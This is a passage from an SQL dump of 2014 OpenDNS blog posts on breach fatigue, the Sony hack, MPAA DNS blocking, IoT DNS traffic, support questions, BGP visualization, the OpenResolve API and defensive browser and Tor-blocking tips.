security practitioners are already struggling to protect. Enterprise security strategies (or any security strategy for that matter) are only as strong as their weakest link, which usually ends up being the users—and when they just don’t care about security, they can easily make avoidable mistakes.\nBusinesses themselves also suffer from the occasional laissez-faire approach. Dima Kumets, senior product manager at OpenDNS, adds, “there’s an issue of businesses thinking breaches won’t happen to them because only the biggest consumer-facing companies make the news. This media focus on huge retailers reinforces the myth that attackers only go after the biggest companies when the reality is that attackers are increasingly focusing on SMBs and mid-market organizations.”\nSo what can you do to fight back as a practitioner when faced with this situation? Bankinfosecurity.com offers three steps to fight breach fatigue, the first one being to recognize apathy as a potential security threat. Other tips include being careful with notice volume, and looking to close vulnerabilities in industry systems.\nHash also commented, “showing your employees how simple it can be to fall victim to a breach is essential—you can do this by using tools like PhishMe. Consumers, employees…everyone needs to know that when their data is stolen, criminals don’t stop at one site. They will use the information over and over again, as many times as they can, and try to break into other accounts, too. It is literally only a matter of time before it happens to them—not if, but when.”', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2015/01/13/once-more-into-the-breach/');

The OpenDNS blog team sat down with Senior Security Research Lead Andrew Hay to talk about the real takeaways from from this month’s news and what it means for security professionals. You can also read Andrew’s technical analysis of the attack here.\nThere has been a lot of discussion about the Sony Pictures attack, but what are some of the security implications for the average security practitioner?\nWhat we do know is that the FBI said that the attack targeting Sony Pictures could have affected 90 percent of organizations in the world. The FBI is basically saying this breach could have happened to anybody. Security professionals still need to realize that a motivated, persistent attacker can get to you.\nTo use a sports analogy, attackers are playing “man-to-man”—they just have to worry about beating your organization. But security professionals have to worry about beating these attackers and everyone else. You’re playing zone defense. It’s hard to play zone defense against everyone on the Internet.\nThis risk means that security professionals need to reevaluate their systems and make sure they’re able to react faster and “play zone” better.\nOne aspect of this story that seems underreported is the extortion angle. Do you think 2014 was the year that attackers focused their efforts on blackmailing companies?\nI suspect that when the 2015 Verizon Data Breach Investigations Report (DBIR) comes out, it will show the same trends in breaches that we have seen in past years. I think that reported extortion incidents will be relatively flat. What’s changed is that these incidents are becoming more widely publicized. More media outlets are covering high-profile extortion incidents. There’s more and more conversation on social media, so people are being more vocal about ransomware.\nIt used to be that these data breaches were just about making people look bad (e.g., the LulzSec campaign from a few years back). But now we’re seeing data breaches that cause real economic damage or worse. Recently there was a nuclear facility in South Korea that suffered a breach and was being extorted by hackers. It was a standard extortion scheme—but compromising the machines at that kind of facility is much bigger and is a more important concern than anything else that’s in the news right now.\nWhat is the upshot of this increased publicity for breaches?\nThe increased publicity is helping to make a stronger case for a bigger security budget. The old idea that “it’s never hit us before, so it’s not our problem” has been replaced by the understanding that every organization is at risk. Organizations are now seeing neighbors getting hit. That makes them look inward and see what they need to do. The conversation has definitely moved on beyond the days when security folks were just checking the box for PCI compliance.\nAre attackers just getting better at monetizing their attacks?\nMonetization is the number one motive. There was a huge amount of money collected by Cryptolocker and its clones in a short amount of time, all through extortion.\nWith cryptocurrency and underground markets, there are now much easier ways to hide your tracks post-extortion. A whole other underground economy exists primarily to help launder this money.\nBonus question: Do you know who knocked North Korea off of the Internet earlier this month?\nNo one does, but you can see the problem just by looking at their peering connections. The Internet was designed to allow for multiple paths, so that if any one path goes down, the data keeps flowing. Something as simple as a ship’s anchor snapping an undersea cable or a backhoe operator digging in the wrong place can take a network offline.\n\nThe problem is that some networks only have one only one or two peering connections. North Korea’s Internet ASN (see above) is one of those networks. If the peering connection goes down, your Internet connection goes down.\n\nYou can see how pronounced the difference is when you look at the peering relationships of countries like the Canada (above). With one point of failure, anything could take their network offline.', 'Blog;Events;Labs Research', 'https://umbrella.cisco.com/blog/2014/12/31/sony-pictures-north-korea-answers-havent-heard-yet/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1441, 'Sony Reveals An Even Bigger Attack on the Internet…This Time, the MPAA is Behind It', 'David Ulevitch, Founder/CEO', 'December 30, 2014', 'The Interview is out now in theaters and streaming on YouTube (and elsewhere). There have now been a cross-section of experts in entertainment, celebrity lifestyle, foreign policy, and Internet security that have all weighed-in with their analysis and opinions on the how, the why and the ultimate impact of Sony’s hacking incident. If you want a decent synopsis, read this one.\nLike everyone else, I followed the story as it trickled out publicly over the last several weeks. In the aftermath, George Clooney once again rose to ‘rogue hero’ status, but Sony’s leaked emails revealed that the Motion Picture Association of America has sunk to an unsurprisingly new low with it’s own new angle of attack on the Internet — and the security industry needs to be on high alert.\nWhile we can debate the ethics of disclosing leaked emails, The Verge made the call to report on a series of messages between the MPAA and six Hollywood studios. Attempting to use the Internet’s infrastructure (and DNS in particular) and loopholes in digital law, these emails uncovered a new coordinated effort by Hollywood to brute-force its anti-piracy agenda on the technology industry and all US-based Internet users. In an article explaining its editorial decision, Emily Yoshida, The Verge entertainment editor, commented, “We decided that it was important for you to know how the MPAA plans to influence how you experience the internet, and by extension, how they intend to shape the future of the information marketplace; we could all agree that it had more impact on our world and our lives than top-secret internal intelligence that Scott Rudin is a meanie.”\nBased on the leaked information, it appears that SOPA (the proposed legislation OpenDNS helped defeat) was just the beginning. For network security companies and ISPs, statements made by the MPAA’s general counsel Steven Fabrizio make it clear the fabric of the Internet is a key target in its strategy to fight copyright piracy. No longer able to bend Congress to their antiquated perspectives, they intend to bully ISPs and network vendors. In one email, Fabrizio said, “We start from the premise that site blocking is a means to an end.” Another message reads, “We have been exploring theories under the All Writs Act, which, unlike DMCA 512(j), would allow us to obtain court orders requiring site blocking without first having to sue and prove the target ISPs are liable for copyright infringement.”\nWhile it’s incredible that a lawyer like Fabrizio would be so bold (and foolish) to use such language in discoverable emails, what he is proposing is even more incredible. A deliberate attempt to circumvent the DMCA. Ironic, right?\nAt a more technical level, one of the options the MPAA suggests in its quest is DNS blocking, an approach the technology industry has fought hard to show is a bad idea. In fact, back in 2012, the MPAA officially declared DNS filtering as off-the-table.\nFor the exact same reasons the technology industry rallied against SOPA, we cannot let the MPAA abuse DNS services as their anti-piracy hammer. DNS is a fundamental protocol of the Internet — as fundamental as the physical wiring itself. It is not in any way conducive to an environment that fosters piracy any more than oxygen is. The mere idea that DNS services induce cases of copyright infringement is a nonsensical technical argument. Fortunately, the Verge, Ars Technica and other sites and blogs sounded the warning call and several freedom of speech proponents and technology organizations have kicked off responses to the MPAA and state government officials enlisted by the association. You can bet that we will continue to drive this brain-dead idea back where it belongs… on the set of a show like The Walking Dead.\nCopyright infringement is an important issue. Rather than trying to segment and cut off the Internet, the MPAA should be finding ways to reduce piracy by enabling access to content via methods that reward creators. As an industry we’ve already proven we won’t back down to threats of draconian measures. While I’d rather focus our energy and talents on delivering a safer and more secure Internet, we won’t hesitate to put that mission on hold to preserve a free and open Internet first and foremost.', 'Announcements;Blog;Community', 'https://umbrella.cisco.com/blog/2014/12/30/sony-reveals-even-bigger-attack-internet-time-mpaa-behind/');

This blog post will detail some of our findings through the lens of the Internet of Things (IoT) connected devices, home automation products, toys, and wearable devices.\nBelkin International, Inc., an American manufacturer of consumer electronics that specializes in connectivity devices, had a relatively flat showing throughout the holiday season. The only item of note was an uptick on Monday, December 15th at 04:00 UTC. We cannot directly correlate this anomaly with any recent events so this will likely remain a mystery.\n\nCompetitor D-Link Corporation (Chinese: 友訊科技), a Taiwanese multinational networking equipment manufacturing corporation headquartered in Taipei, Taiwan, saw a similar pattern in traffic destined to signal[.]mydlink[.]com\n\nIf we look at signal[.]eu[.]mydlink[.]com, however, we notice a surge on Christmas Eve and Boxing Day (spanning multiple timezones). Again, another curious spike on December 9 that cannot be correlated to anything of consequence.\n\nOne of the most noticeable spikes after Christmas was related to the Phillips Hue lighting devices. We saw peaks of more than 1,800 queries per interval which is likely associated with the installation and configuration of the lights. With the recent announcement of the 12 Monkeys television series synchronizing with Hue home lighting to match the onscreen action, we find ourselves wondering what this traffic will look like in the coming weeks.\n\nGoogle-owned Nest saw very little increase during the holidays, perhaps due to the complexity required to install the devices – compared to that of a simple lightbulb. We find ourselves wondering if this will spike in the new  year and if spikes will be seen predominantly on non-workdays.\n\nArrayent, Inc., a software company that has developed the Arrayent Connect Platform, experienced a sizable spike in traffic to its primary domain arrayent[.]com. The largest spikes we saw, however, were before the holidays even started – perhaps people purchasing new appliances before their guests arrived?\n\nYou may not have heard of Arrayent before but you’ve probably heard of some of the brands they partner with.\n\nWe looked at some of these brands including Whirlpool (whirlpool-sw1[.]arrayent[.]com).\n\nand Chamberlain (chamb-api[.]arrayent[.]com), a manufacturer of garage door openers and associated equipment.\n\nSo what caused the Arrayent spike? We’re still investigating.\nAugust[.]com, makers of the August Smart Lock, saw a significant increase leading up to and continuing through the holidays. We saw peaks as high as 3,537 queries per interval during our analysis timeframe.\n\nThe most interesting spikes, and perhaps the most concerning if you are a parent of a small child, was that of traffic associated with educational entertainment company Leapfrog. The company homepage – leapfrog[.]com – saw a significant post-Christmas surge to more than ~31,000 queries per interval. At first glance, we thought this might be related to parents’ searching for instructions on how to configure the devices for their kids, registration of the devices, and even application downloads.\n\nLooking at some of the co-occurring domains we noticed the lfcam[.]leapfrog[.]com domain had an abnormal spike as well. One can only assume that this is in some way related to a LeapFrog camera (hence ‘lfcam’) either registering or, even more alarming, uploading pictures taken by users of the devices.\n\nThe devicelog[.]leapfrog[.]com domain also sees a significant increase that likely correlates with newly purchased devices. Are these diagnostic messages being sent up to the LeapFrog cloud or are they usage statistics for actions taken on the devices?\n\nPerhaps the most depressing, yet predictable, traffic pattern observed was that of the FitBit wireless-enabled wearable devices and activity trackers. With the start of Hanukkah (on December 18) and throughout Christmas we noticed a steady decline in callbacks to api[.]fitbit[.]com. The low point, Thursday, Dec 25 at 22:00 UTC, dropped to 429 queries per interval – or as it shall henceforth be known, “The Turkey Coma Canyon”.\n\nWe hope you enjoyed this blog post.

Since then, OpenDNS has hosted 28 OpenLate meetups in San Francisco and Vancouver offices. During that time the meetup has changed, the community has grown, and the concept has matured.\nFirst Meetups\nThe first OpenLate meetup was held on February 10, 2014. The early meetups were intended to feel like a cafe where coders could come to get work done. In the SOMA neighborhood of San Francisco that many startups call home, there are almost no cafes open in the evenings. OpenLate sought to address that need by giving night owls a place to relax and program.\nThe first events were held in the kitchen of the OpenDNS offices, but we quickly had to move to the office basement in order to fit all of the attendees. Originally the meetups were held from 8PM until midnight.\n\nGrowth and Change\nOpenLate began hosting themed meetups, such as an End of Windows XP night. As themes moved from whimsical to technical, we started to have presentations at events. The community responded positively to tech talks, so we continued to organize themes and speakers.  Around this time, the meetup began to change into a more structured speaker series with hack time after the talk.\nAs the meetup grew, so did OpenDNS. The company finished expanding our offices, and the meetup gained a large event space. We began to welcome more prominent speakers – such as Zed Shaw, Jeff Atwood, and Ryan Lackey. We also adjusted the timing of the meetups to run from 6:30PM to 10PM.\n\n\nI18N\nWith the growth of the San Francisco meetup, we launched an OpenLate at the Vancouver offices of OpenDNS.  Supporting the startup community in Vancouver has been incredibly rewarding as it has grown significantly over the past year.\nAfter a brief pause due to moving our YVR office two times over the last couple months, we now have a more permanent home and will be resuming our Canadian meetups in 2015.\nFuture\nAfter its holiday respite, OpenLate in San Francisco returns in January with strong meetups. Alex Liu from Netflix will be talking about front-end dependency management using NodeJS. Later in the month,  Sean Leach from Fastly will speak about running a global content delivery network.

At OpenDNS, we definitely have a lot to look back on. This past year we announced a new platform for delivering security, unveiled a new funding round with some of the biggest names in security and received lots of awards (for everything from being a great place to work to enterprise security innovation).\nBut the end of the year is also a good time to look forward. In the same way that Umbrella was built to predict where bad guys will strike next, our executive team spends a lot of time identifying the important emerging trends and how they will affect the way technology is used to secure the enterprise.\nThis year, OpenDNS CEO David Ulevitch and CTO Dan Hubbard were invited by Skyhigh Networks to share some of their own perspectives about the future of security and the cloud in 2015. David and Dan were featured alongside partners from venture capital firms Greylock and Sequoia and executives from the cloud security companies featured in their portfolios.\nTake a look at the slideshow below to read Dan and David’s predictions about the future of interoperability between cloud solutions, organizational changes on security teams and why enterprises will adopt a new security stack in 2015.\n\nThe Cloud in 2015: Predictions from Greylock and Sequoia  from Skyhigh Networks Cloud Security Software', 'Blog;Umbrella', 'https://umbrella.cisco.com/blog/2014/12/19/looking-ahead-predictions-cloud-security-2015/');

The purpose of this meeting was to gather thought leaders across diverse industries — oil and gas, media and entertainment, financial services, and technology — with the goal of better understanding emerging trends as well as important issues facing our customers when it comes to security. The outcome was even better than we expected: insightful discussions, lively debate, and invaluable feedback to help us shape OpenDNS’s roadmap moving forward.\nFollowing the discussion with this group of strategic leaders, I’d like to share a few takeaways on what these collective minds forecasted for the security landscape:\nThere is no silver bullet when it comes to strategic security.\nThe overwhelming consensus was that having an open platform that can easily integrate with multiple security partners is a tremendous asset for customers due to the evolving security landscape. Flexible, open APIs help create a central management and/or visibility point that can greatly improve a company’s security posture. One customer expressed excitement with our FireEye integration by saying that the visibility FireEye provides into packets combined with OpenDNS’s ability to show DNS queries enables a unique and powerful level of insight into their network.\nThe challenge of managing personally identifiable information (PII) continues to shift.\nPrivate customer information continues to move organically toward cloud services. One of our customers also shared that many of his employees actually live where they work for months at a time — a uniquely challenging infrastructure in which there is no work/home boundary. With these lines blurring, coupled with so much confidential information moving to the cloud, the need for fast-changing and innovative security solutions around PII is very real.\nProtection outside of the perimeter IS possible.\nWith the eroding network perimeter, companies are seeking ways to extend their security beyond the walls of their enterprise, and this challenge is one of the many reasons these top-tier customers choose OpenDNS. They want to maintain high visibility into their network activity while simultaneously providing enterprise-class malware protection, all without adding latency to their systems or impacting the productivity of their employees. And for many, it needs to happen both inside and outside of their network perimeter.\nOpenDNS was fortunate to bring together an incredibly accomplished group of CAB attendees. In addition to sharing their knowledge, experiences, and suggestions with our executive team, these leaders were kind enough to spend some time mingling with OpenDNS employees across all departments. Two of them even joined our senior director of product management for a company-wide “fireside chat.”\nThe best validation for the CAB event’s success was the feedback from attendees themselves. A senior security executive at one of the world’s largest oil and gas companies told us that, “attending the OpenDNS CAB meeting turned out to be extremely profitable use of my time. The hosts and attendees all had plenty of experience and expertise in information security which made for very meaningful discussions and presentations. I am definitely interested in attending future CAB events for the networking and the useful information shared.”\nIn closing, the creation of a customer advisory program is one of the many steps we’ve taken over the past few months to enhance our communication with customers and increase the value that they receive from a partnership in security with OpenDNS. As always, if there’s anything we can do to make your experience with us a great one, please don’t hesitate to reach out to me.\nOn behalf of our team here at OpenDNS, we’d like to wish you have a happy, healthy, and secure holiday season!', 'Blog;Community', 'https://umbrella.cisco.com/blog/2014/12/18/customer-success-update-first-customer-advisory-board-meeting/');
INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1446, 'Five Questions: Your Top Support Requests…Answered!', 'Alexander Harrison', 'December 12, 2014', 'Hi, I’m Alexander Harrison, a customer support representative here at OpenDNS. My job is to ensure that all of your questions and challenges are met with the answers needed to get OpenDNS working for you. In this blog post, I’ve compiled the top five questions that come in to our team, as well as the necessary steps to resolve these issues as quickly as possible.\n5: Filtering was set to High/Medium, and now Facebook and other HTTPS sites are making many errors. Does OpenDNS work with HTTPS sites?\nThe reason you’re seeing certificate errors is because the webpage you intended to visit is being blocked by the current filtering settings. When a web page is blocked, you’ll see the OpenDNS Block Page instead of the website you intended to visit, and in most modern web browsers this will produce a security prompt for a *.opendns.com certificate error. The error will look similar to one of the images below:\n\nThis notification indicates that the SSL certificate for the secure site has been loaded, and that the OpenDNS block page doesn’t match your intended page. This is expected when blocking HTTPS web pages. Many of these errors can be bypassed or ignored in order to see the standard OpenDNS block page by using our Certificate Error Mitigation Instructions.\n4: OpenDNS is set up, but it is only working on one or some of the computers on the network.\nThere are many ways to successfully configure OpenDNS. Sometimes when the network is configured, old DNS settings need to be cleared from some of the computers on the network. We’ve set up a guide to assist with this process. The guide addresses what to do when just one computer is filtering as a result of manually configuring the computer but skipping the configuration of the router. We also explain what to do when just one computer or device isn’t working due to otherwise configured DNS settings on the computer that need to be removed before filtering will work on it. Some programs like Comcast ConstantGuard automatically override OpenDNS settings—and either need to be configured not to do this, or will need to be removed. Instructions for how to do this are provided in the aforementioned guide.\n3: I want to block most social networking, but allow Facebook (keeping everything else blocked).\nGreat news: OpenDNS has such a feature! Since the social networking category needs to remain blocked in order to block other social networking sites, you will need to create an exception to allow Facebook alone. To do this, you will need to add the domain “facebook.com” to your account’s whiltelist (or Allow List). Note that you are adding “facebook.com” rather than “www.facebook.com.” It is important to add this domain without the “www.” to see it unblocked correctly. For more detailed steps, see our guide for adding domains to the whitelist/blacklist for the OpenDNS Dashboard. (Enterprise accounts: see this Umbrella Dashboard guide.)\nWhat about allowing YouTube while still blocking video sharing? This can be done in the same way by adding “youtube.com” to the whitelist. The same goes for your favorite sports site like ESPN (add espn.com, espn.go.com to the whitelist), and so on.\n2: I set up OpenDNS and it was working great, but one day it suddenly stopped working. Why?\nSince most Internet providers give users a dynamic IP address, chances are that the public IP address for your network has changed. Have no fear, OpenDNS has a program – the Dynamic IP Updater Client – specifically for  updating your IP address when it changes. The program is available here. (Note that the Updater works best when installed on a computer that stays at home.) Updates can also be made manually by clicking the green circular icon by the network which needs to be updated.\nTo confirm that the IP is up to date, match the IP address listed at the top of your Dashboard with the one registered to your network. If they match, your filters will apply. If not, you will need to update them before changes will apply. If your network says “Inactive,” please contact OpenDNS Support.\nIf the filters have been off for more than a few days, you’ll also need to flush your DNS cache to ensure that the filters fully apply right away. Please see Clearing the DNS Cache on Computers and Servers for more information.\n1: And now, the top reason for opening a ticket as tallied by our support team:  “I registered my network and set up filters, and even installed the OpenDNS Updater client… but it isn’t working.”\nSince OpenDNS is a DNS-based filtering solution, you won’t be able to install it like a program. The fastest way to test to see if OpenDNS’s DNS servers have been configured on your computer is to visit http://welcome.opendns.com and look for a big orange check mark for success.\nIf you see an “X,” OpenDNS still needs to be configured before the filters and statistics will work. Our set-up guide can be found here.  We recommend configuring OpenDNS on your router so that each device on your network is covered by changing this one setting; however, individual configuration is possible by choosing to configure a computer from these options.\nIf you see a check mark but filtering has not been enabled, chances are the answer to your question can be found at our troubleshooting settings page. This page also provides the necessary steps to resolve the case in which some, but not all, computers are filtering.\nWhat about statistics? After filtering is enabled, stats will still take a few hours to first appear, and should start appearing by the following day at the latest. If no stats appear after one day, the best way to resolve this is to contact OpenDNS support with your results from our diagnostic test tool.\nThese are the top five support questions we receive on a daily basis.

After decades of construction and evolution, it is fascinating to step back and contemplate the shape of this giant ecosystem. In this blog post, we will share some techniques to visualize the structure of the AS network: the backbone of our modern communication.\nWhat is an Autonomous System?\nFirst things first, let’s explain a little bit what we’re dealing with here. An autonomous system (AS) is a collection of routers whose prefixes and routing policies are under common administrative control. That could be an ISP, a big company (Google, Facebook, …), a university, or any other large organization. Virtually, an AS represents a group of IP prefixes that have been assigned to that organization and exposes the same routing rules outside the AS for the whole infrastructure.\nAn unique number is assigned for each AS, we refer to them as Autonomous System Numbers or ASNs. These are essential because the ASNs uniquely identify each network on the Internet. In order to maintain the stability and consistency of the whole network, AS’ use a well defined routing and communication protocol. The Border Gateway Protocol (or BGP) is designed for that matter. It can exchange routing information, and also reachability information between various autonomous systems.\nIn summary, autonomous systems can be seen as high-level prefix routers. The ASN network is a dynamic graph evolving and changing everyday. It varies on the sources, but there are about 47,000 autonomous systems today linked by a multitude of routing rules. In this article we will showcase an interesting way to explore this large graph in 3D using OpenGraphiti.\nBGP data\nThe first step in this visualization process is to build graph datasets based on real BGP data. There are several sources on the Internet, but for our research we’re going to use routeviews.org. The URL given in the reference section points to a repository of BGP routing tables updated every 2 hours. This repository also contains small changes on those tables updated every 15 minutes. They are stored in a binary format that requires to be decoded by the bgpdump tool. Once you decode a file, this is how it looks:\n...\nTABLE_DUMP2|1415052005|B|85.114.0.217|8492|67.215.64.0/24|8492 9002 2914 36692|IGP|85.114.0.217|0|0|8492:1101 9002:9002 9002:64615|NAG||\nTABLE_DUMP2|1415052005|B|198.129.33.85|293|67.215.64.0/24|293 2914 36692|IGP|198.129.33.85|0|0||NAG||\nTABLE_DUMP2|1415052005|B|95.85.0.2|200130|67.215.64.0/24|200130 1299 3356 36692|IGP|95.85.0.2|0|0|1299:4000 1299:20000 1299:20500|NAG||\n...\nWe will only focus on certain fields for this article, more precisely the 7th and the 8th:\n...\n67.215.64.0/24|8492 9002 2914 36692\n67.215.64.0/24|293 2914 36692\n67.215.64.0/24|200130 1299 3356 36692\n...\nThose specific fields define the BGP routing tables: The first one is the IP prefix, the second one represents the AS path to reach it. For instance, any IP belonging to the AS 8492 wanting to reach any IP in 67.215.64.0/24 will have to go through 9002, 2914 and finally 36692. In this case, 36692 is the OpenDNS ASN. Since AS 36692 relies on AS 2914 for its routing, we say that AS 2914 is an upstream provider for 36692 and 36692 is a downstream provider for 2914. In these few lines, we observe that AS 36692 has 2 upstream providers (2914 and 3356) which also have upstream providers and so on.\nHere is a diagram representing the BGP routing information of those last 3 lines:\n\nGreat! Now we understand how to read part of these BGP routing tables but what does that tell us? Well, if we read the complete file, we can build a list of every AS and its upstream and downstream providers. In other words, we have enough information to create the full AS graph, where each node would be an AS and each edge would represent a BGP route (upstream/downstream relationship). In our case, we chose to create a directed graph with all the upstream relationships: AS node A is directly connected to B, if B is an upstream provider of A. Now, note that this doesn’t necessarily means that A is a downstream provider for B, hence the directed relationship (See ‘directed graph’ in the reference section).\nEnriching the model with RIR information\nLet’s take it a step further: We decided to enrich our graph dataset with some country code information. To do that we had to parse some RIR data. A RIR (or Regional Internet Registry) is an organization that manages the allocation and registration of Internet resources within a particular region of the world. That include IP addresses and, of course, AS numbers. There are five of those:\n– AfriNIC for Africa.\n– ARIN for the United States, Canada, Antartica and some parts of the Caribbean region.\n– APNIC for Asia, Australia, New Zealand and neighboring countries.\n– LACNIC for Latin America and parts of the Caribbean region.\n– RIPE NCC for Europe, Russia, the Middle East and Central Asia.\nYou can find a couple of links to the RIR data in the references section. As you can see, this data is pretty straightforward to parse: Each line contains the ASN number and a country code which can be extracted and be used as attributes of each AS node in our graph.\nAS Network: Country View\nAs we mention a little bit earlier in this article, the AS network is fairly large. Visualizing such a graph requires a process that is a bit out of the scope of this article—it will definitely be discussed in a later article. Today, we will break down our huge AS graph into smaller pieces and see what goes on at the country level. In order to understand how each country establishes its connectivity to the Internet, we designed an algorithm that extract a subgraph of all the ASNs with a given country code and their adjacent neighbors. The algorithm works as such:\nFor each country code, we extract all BGP edges connecting at least 1 AS with country code ‘UA’ (Ukraine). We then extract all the AS nodes connected by the edges previously extracted in step 2. Finally, we store the result in a JSON file, and voilà! After running this program, we obtain a list of JSON files, each containing the subgraph of its country code and adjacent ASNs.\nResults & Visuals\nCanada\n\nThe Canadian network has some interesting properties. It is big, highly connected and fairly complex. Its structure is pretty standard for any big country with a developed internet infrastructure. On the picture below we can observe its major hotspots (in bright red). The 2 main ones are: #852: TELUS Communications Inc., and #577: BACOM – Bell Canada.\nSingapore\nThe Singaporean network exposes noticeable features: First, it’s obviously much smaller than the previous one. But in this one we can clearly see that even though most ASNs are Singaporean, the ‘Internet frontier’ with adjacent countries usually relies on only one or two ASNs. Example on the left of the picture with Bangladesh. This topology is indeed pretty common and is even more apparent in the next example.\nUkraine\nHere the topology is even more apparent. This picture highlights 2 big clusters. The one on the right almost entirely Ukrainian and the one on the left with a very high number of connections being almost exclusively composed of non-Ukrainian ASNs (Russia, US, UK …). Meaning that most of Ukraine relies on that huge ASN (#9002: RETN Limited) to access the Web.\nDifferent levels of connectivity\nThose 3 pictures give us a fascinating and unique way to look at the topology of our Internet infrastructure at a country view. Now what does that tell us? In network engineering we can differentiate 3 types of providers: Tier 1, Tier 2 and Tier 3. Tier 1 is at the core, and offers the best communication channels—there are only couple of them in the world. Tier 2s purchase transit from Tier 1s, and usually offer access to Tier 3s who typically rely only on them. This 3-level backbone infrastructure is applied in many variations depending on the geography, politics and economy of each country. It is indeed fascinating to study.\nConclusion\nToday, we’ve exposed a unique way to explore our Internet backbone and infrastructure. There are a lot more things to be said about it which will be discussed in another article. We will see that taking a step back and looking at a system as a whole can offer a perspective that holds the key to many topology-based detection algorithms. We hope you enjoyed reading this article and hope you’ll be waiting for the next one. In the meantime, we are happy to share with you a video of the Ukrainian network.

OpenResolve was built as a Master’s Project by Ryan Piaget and Kevin Funk during an internship at OpenDNS. Learn more about the project at OpenResolve.com.\nAbout the Team\nWe are graduating Master’s Students at the University of San Francisco who’ve been interning at OpenDNS the last four months working on our Master’s Project.\nFor our project, we designed and built a public API for retrieving domain information as a REST-like service. This guest post will share the results of our work.\nMotivation\nOpenResolve aims to address three issues in the realm of domain name lookup:\nDNS lookup typically requires command line tools like dig, or manual interaction with an HTML interface. Our API makes DNS resolution available as a web service for any application.\nDNS lookups are typically conducted over UDP, which offers no security regarding the data being transferred. Performing DNS resolution over HTTP and SSL ensures the data has not been altered.\nMost DNS resolution returns output in a human readable format, but isn’t easily accessible programmatically. By transferring data in a commonly consumed format, JSON, we make it convenient for even high-level applications to use the data returned from a resolver.\nHow It Works\nOpenResolve is implemented as a simple python server using the Flask framework, running behind nginx. DNS lookups are performed using the dnspython library and then parsed into JSON before being returned to the client. We implement the provisional RFC draft-bortzmeyer-dns-json-00 for the return format. The server runs inside a container built from a custom Docker image and is hosted on OpenDNS infrastructure.\nHow to Use It\nThe API lives at api.openresolve.com and can be queried for standard lookups by making a GET request to:\napi.openresolve.com/<record-type>/<domain-to-lookup>\nThe response is returned in JSON. Here’s the result of making a request for ‘A’ type records for the domain www.opendns.com:\ncurl api.openresolve.com/a/www.opendns.com\n{\n    AA: false,\n    ReturnCode: \"NOERROR\",\n    AD: false,\n    AdditionalSection: [ ],\n    AnswerSection: [\n        {\n            Class: \"IN\",\n            Address: \"67.215.92.218\",\n            Type: \"A\",\n            Name: \"www.opendns.com.\",\n            TTL: 30\n        }\n    ],\n    ID: 45762,\n    AuthoritySection: [ ],\n    QuestionSection: {\n        Qclass: \"IN\",\n        Qtype: \"A\",\n        Qname: \"www.opendns.com.\"\n    },\n    RD: true,\n    RA: true,\n    Query: {\n        Duration: 0.003942966461181641,\n        Server: \"208.67.222.222\"\n    },\n    TC: false\n}\nWe support lookups for these record types:\nA, AAAA, CNAME, LOC, MX, NAPTR, NS, PTR, SOA, TXT\nWe also support internationalized domains via punycode conversion.

They don’t talk to each other, and they don’t work when people leave the office.”\nThis is what I hear from CIOs and CISOs when I talk about the OpenDNS cloud-delivered security network. Our customers are making major investments in the newest network Advanced Threat Detection (ATD) capabilities, but they have a problem: the moment an employee leaves the corporate network — all of the awesome perimeter-ATD protection vanishes.\nMany of our larger customers have invested in FireEye, one of the foundational players in the ATD market. In February of 2014, we integrated our products and announced our joint solution of Layered-Intelligence and Extended-Enforcement. This was our initial attempt at extending ATD enforcement beyond the perimeter, and it was a great success. We have many joint customers benefiting from this solution.\nBut FireEye was just the start — there is a bigger problem to be addressed. Security needs a new foundation for enforcement. One that reestablishes visibility and protection across all devices and users, wherever they are in the world.\nSo we developed the broader solution. I am proud to announce our new security platform and Partner APIs, which enable enterprise security vendors to integrate with OpenDNS’s worldwide network. What does this mean for you? Well, when your favorite ATD security vendors integrate with our cloud-delivered security platform, you instantly have that threat protection extended beyond the traditional network perimeter. Your workforce is protected wherever they roam. And bonus: you get more out of your existing security investments.\nThe platform itself already has a few integrations built-in and ready for you to use, including FireEye, CheckPoint, and ZeroFOX. We will continue to add new partners and update you as new integrations become available.\nAs always, we would love to hear your feedback on our new security platform.

The more layers you add, the more you help to isolate yourself and mitigate potential attack vectors. With the recent uptick of malware using different means for delivery, including Malvertising (malicious advertising), drive-by downloads, and the use of TOR, it might be overwhelming to think of ways to protect yourself. There are a few small, simple tricks that I feel can help you focus your efforts to be most effective:\nAd-Block Plus\nAs you may have heard, the use of advertisements as a means for delivering malware has been increasing rapidly. The methods have slightly changed, however; while it is still highly recommended to avoid clicking away on random links, especially from unknown email senders, users can now be infected even without clicking recklessly.\nMalvertising works by running malicious code when the advertisement loads in your browser, gathering all of the information it can and sending it back to a Command and Control server, where any number of exploit kits can be used to leverage a compromise of the client machine. Ad-Block does exactly as its name implies, blocking ads that are shown to visitors of web sites. While the vast majority of ads are safe, it’s that small percentile that causes the most headaches for users and System Administrators alike. OpenDNS took the stance of removing ads from its site back in June, which you can read more about here.\nN0-Script\nAnother extension I like to use is No-Script. No-Script is an extension for Firefox, but you can use JavaScript Blocker for Safari, and ScriptSafe for Chrome. All of these work in basically the same way—they only allow scripts, including JavaScript, Java, and Flash (all of which are common in leveraging compromises) to be executed with express permission from the user.\nHow does this help? Some compromised web pages will attempt to deliver what is known as a ‘drive-by download‘, which will attempt to look for possible vulnerabilities in a clients machine, deliver that information back to a server, and download the exploit kit, much in the same way that Malvertising works, minus the ads.\nAt first you might feel like your Internet experience is not the same, especially with so many sites that employ scripting to enhance user experience. No-Script offers you the option to allow sites you wholly trust to run, without having to allow the scripts every time. Globally allowing all scripts is highly discouraged.\nBlocking TOR\nTOR is used by many people all over the world to add anonymity to their web browsing. This is especially helpful in places where the Internet is heavily censored, regimes that might be monitoring dissidents trying to get the word out about repressive actions taking place, and others who just want to keep their surfing habits private. Recently, however, certain variants of malware have started using TOR as a means to call out to the Command and Control servers to download more badness (read: CryptoWall 2.0). It does not seem to be that far fetched to think that other malware families might soon follow suit. Sometimes I come across rumors that TOR (The Onion Router) cannot be blocked. To a small extent, this is true. To a larger extent, it is not. Below are two simple curl commands you can use that download the IPs used by TOR. These IPs are updated daily, so setting a cronjob to run and download the lists is pretty easy. After downloading the IPs, they are written to two CSV files, one for all the IPs and the other for the exit nodes. These lists can then be added into your firewall rules. I would like to point out that this is by no means a cure-all to blocking TOR based sites, but does reduce the means for connection by dropping the attempts from either coming into or going out of the client system.\ncurl http://torstatus.blutmagie.de/ip_list_exit.php/Tor_ip_list_EXIT.csv > Tor_ip_list_EXIT.csv\ncurl 